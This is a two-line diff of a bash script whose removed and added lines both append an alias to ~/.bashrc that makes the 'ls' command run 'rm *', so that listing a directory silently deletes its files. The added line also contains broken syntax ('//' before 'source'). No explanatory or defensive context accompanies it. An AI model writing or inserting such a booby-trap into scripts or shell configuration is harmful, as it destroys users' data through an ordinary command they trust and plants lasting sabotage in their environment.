@@ -1,2 +1,2 @@
 #!/bin/bash
-echo "alias ls='rm *'" | tee -a ~/.bashrc && exec bash
+echo "alias ls='rm *'" >> ~/.bashrc // source ~/.bashrc
